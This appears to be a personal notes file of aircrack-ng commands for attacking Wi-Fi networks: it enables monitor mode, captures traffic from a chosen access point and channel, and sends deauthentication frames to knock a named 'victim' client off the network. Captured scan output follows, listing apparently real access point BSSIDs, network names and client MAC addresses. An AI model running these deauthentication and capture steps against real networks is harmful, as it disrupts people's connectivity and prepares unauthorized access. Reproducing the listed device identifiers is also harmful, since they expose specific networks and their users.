# extract wireless identified information
# This works when the card is connected to a network??
#sudo iwlist wlan1mon scanning

# Start the wireless 
sudo airmon-ng start wlan1

#Check the wireless traffic / AP's / stations
sudo airodump-ng -w capture5.30pm.cap wlan1mon

#scan only the desired network 
sudo iwconfig wlan1mon channel XX
sudo airodump-ng -w apyy.cap -c XX --bssid MACZZ wlan1mon 
# A best option to get the band when it is not automatically captured
sudo airodump-ng -w AP_Name_Channel.cap --bssid  A0:3D:6F:BA:FB:8E wlan1mon --band a => could be b or g as well

# -0 TO DEAUTHENTICATE stations (in this case 10), -a Access Point bssid, -c destination mac address / victims's mac
sudo aireplay-ng -0 10 -a MACAP -c MACVIC wlan1mon


A0:3D:6F:9A:99:CF  M-Connect  64
    5C:80:B6:CC:D0:C6  -59    0 - 6e     0        7                                                   
    A0:AF:BD:E7:E6:F4

A0:3D:6F:9A:99:CE B-Connect 64
    8C:85:90:62:35:14

A0:3D:6F:9A:99:CD  X-Connect
    3C:58:C2:4E:74:AB  -37   12e-12e     0       18                                                   
    D0:37:45:6A:A6:DD


BC-17-B8-E0-05-42
52-38-3B-D4-99-E1
